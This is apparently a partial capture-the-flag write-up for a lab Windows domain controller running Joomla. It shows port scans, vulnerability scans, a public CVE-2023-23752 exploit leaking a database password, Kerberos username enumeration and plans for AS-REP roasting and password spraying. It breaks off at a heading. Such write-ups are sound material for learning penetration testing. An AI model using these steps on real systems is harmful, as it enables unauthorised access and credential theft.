# Host file setup

```python
sudo nxc smb 10.129.230.226 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:None)
```

# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT dc.office.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 16:59 +0100
Nmap scan report for dc.office.htb (10.129.230.226)
Host is up (0.014s latency).
rDNS record for 10.129.230.226: DC.office.htb
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
59909/tcp open  unknown
59917/tcp open  unknown
59944/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.35 seconds
```

## Nmap
```python
nmap -p 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT dc.office.htb 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 17:02 +0100
Nmap scan report for dc.office.htb (10.129.230.226)
Host is up (0.013s latency).
rDNS record for 10.129.230.226: DC.office.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-title: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-13 00:02:28Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2026-05-13T00:03:54+00:00; +8h00m03s from scanner time.
443/tcp  open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: 403 Forbidden
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2026-05-13T00:03:53+00:00; +8h00m02s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-13T00:03:54+00:00; +8h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2026-05-13T00:03:53+00:00; +8h00m02s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# HTTP (80)

## Nuclei
```python
nuclei -u http://office.htb/                                                                         

[http-trace:trace-request] [http] [info] http://office.htb/
[cookies-without-secure] [javascript] [info] office.htb ["3815f63d17a9109b26eb1b8c114159ac"]
[waf-detect:apachegeneric] [http] [info] http://office.htb/
[ldap-metadata] [javascript] [info] office.htb:389 ["DomainControllerFunctionality: 7","BaseDN: dc=389","DnsHostName: DC.office.htb","DefaultNamingContext: DC=office,DC=htb","DomainFunctionality: 7","ForestFunctionality: 7"]
[smb-enum-domains] [javascript] [info] office.htb:445 ["DomainName: office.htb"]
[smb-enum] [javascript] [info] office.htb:445 ["ForestName: office.htb","OSVersion: 10.0.20348","NetBIOSComputerName: DC","NetBIOSDomainName: OFFICE","DNSComputerNamen: DC.office.htb","DNSComputerName: DC.office.htb"]
[smb-version-detect:smb-version] [javascript] [info] office.htb:445 ["SMB 2.1"]
[smb-os-detect] [javascript] [info] office.htb:445 ["Windows Server 2022, Version 21H2"]
[smb2-server-time] [javascript] [info] office.htb:445 ["SystemTime: 2026-05-13T00:14:36.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb2-capabilities] [javascript] [info] office.htb:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[ldap-anonymous-login-detect] [javascript] [medium] office.htb
[joomla-detect:version] [http] [info] http://office.htb/administrator/manifests/files/joomla.xml ["4.2.7"]
[joomla-manifest-file] [http] [medium] http://office.htb/administrator/manifests/files/joomla.xml
[http-missing-security-headers:strict-transport-security] [http] [info] http://office.htb/
[http-missing-security-headers:permissions-policy] [http] [info] http://office.htb/
[http-missing-security-headers:x-content-type-options] [http] [info] http://office.htb/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://office.htb/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://office.htb/
[http-missing-security-headers:content-security-policy] [http] [info] http://office.htb/
[http-missing-security-headers:clear-site-data] [http] [info] http://office.htb/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://office.htb/
[http-missing-security-headers:missing-content-type] [http] [info] http://office.htb/
[mixed-passive-content:img] [http] [info] http://office.htb/ ["http://office.htb/images/asdf.png"]
[form-detection] [http] [info] http://office.htb/
[robots-txt-endpoint:endpoints] [http] [info] http://office.htb/robots.txt ["/installation/","/layouts/","/modules/","/tmp/","/joomla/administrator/","/api/","/administrator/","/bin/","/cache/","/includes/","/cli/","/components/","/language/","/libraries/","/logs/","/plugins/"]
[corebos-htaccess] [http] [info] http://office.htb/htaccess.txt
[cgi-printenv] [http] [medium] http://office.htb/cgi-bin/printenv.pl
[host-header-injection] [http] [info] http://office.htb/
[apache-detect] [http] [info] http://office.htb/ ["Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28"]
[openssl-detect] [http] [info] http://office.htb/ ["OpenSSL/1.1.1t"]
[php-detect] [http] [info] http://office.htb/ ["8.0.28"]
[robots-txt] [http] [info] http://office.htb/robots.txt
[CVE-2023-23752] [http] [medium] http://office.htb/api/index.php/v1/config/application?public=true
[missing-cookie-samesite-strict] [http] [info] http://office.htb/ ["3815f63d17a9109b26eb1b8c114159ac=eccpudug1h5igkgd2f9duum1fi; path=/; HttpOnly"]
[metatag-cms] [http] [info] http://office.htb/ ["Joomla! - Open Source Content Management"]
[tech-detect:font-awesome] [http] [info] http://office.htb/
[tech-detect:php] [http] [info] http://office.htb/
[caa-fingerprint] [dns] [info] office.htb
```
- Joomla version 4.2.7
- Joomla manifest file `http://office.htb/administrator/manifests/files/joomla.xml`
- CVE-2023-23752?
- robots.txt

## Joomscan
```python
joomscan -u http://office.htb/

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.7

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://office.htb/administrator/components
http://office.htb/administrator/modules
http://office.htb/administrator/templates
http://office.htb/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://office.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://office.htb/robots.txt 

Interesting path found from robots.txt
http://office.htb/joomla/administrator/
http://office.htb/administrator/
http://office.htb/api/
http://office.htb/bin/
http://office.htb/cache/
http://office.htb/cli/
http://office.htb/components/
http://office.htb/includes/
http://office.htb/installation/
http://office.htb/language/
http://office.htb/layouts/
http://office.htb/libraries/
http://office.htb/logs/
http://office.htb/modules/
http://office.htb/plugins/
http://office.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/office.htb/
```

# CVE-2023-23752

https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT

```python
python3 CVE-2023-23752.py -u http://office.htb/
┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓
┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛
┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━
Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ
Updated By: muhammedikbalyildiz

[*] Checking if target is vulnerable
[+] Target is vulnerable
[*] Launching exploit against: http://office.htb/
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for usernames at path: /api/index.php/v1/users?public=true
[+] Target is vulnerable for usernames
[+] Gathering user(s) for: http://office.htb/
[+] Name: Tony Stark
[+] Username: Administrator
[+] Email: Administrator@holography.htb
[+] Group: Super Users
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for credentials at path: /api/index.php/v1/config/application?public=true
[+] Target is vulnerable for credentials
[+] Gathering credential(s) for: http://office.htb/
[+] User: root
[+] Password: H0lOgrams4reTakIng0Ver754!
```

Looks like the exploit worked

```python
root:H0lOgrams4reTakIng0Ver754!
```
Ill try these credentials on the administrator logon

These credentials dont work!

Im thinking there could be password reuse

# Finding valid usernames

```python
kerbrute userenum --dc dc.office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/12/26 - Ronnie Flathers @ropnop

2026/05/12 17:49:59 >  Using KDC(s):
2026/05/12 17:49:59 >  	dc.office.htb:88

2026/05/12 17:50:02 >  [+] VALID USERNAME:	 administrator@office.htb
2026/05/12 17:50:24 >  [+] VALID USERNAME:	 Administrator@office.htb
2026/05/12 17:50:35 >  [+] VALID USERNAME:	 etower@office.htb
2026/05/12 17:50:35 >  [+] VALID USERNAME:	 ewhite@office.htb
2026/05/12 17:50:35 >  [+] VALID USERNAME:	 dwolfe@office.htb
2026/05/12 17:50:35 >  [+] VALID USERNAME:	 dlanor@office.htb
2026/05/12 17:50:35 >  [+] VALID USERNAME:	 dmichael@office.htb
```
Found some valid usernames

I can try some things like AS-REP roasting!

None of the users are AS-REP roastable, but i could try a password spray since i do have a password

# Password spray leads to user compromise

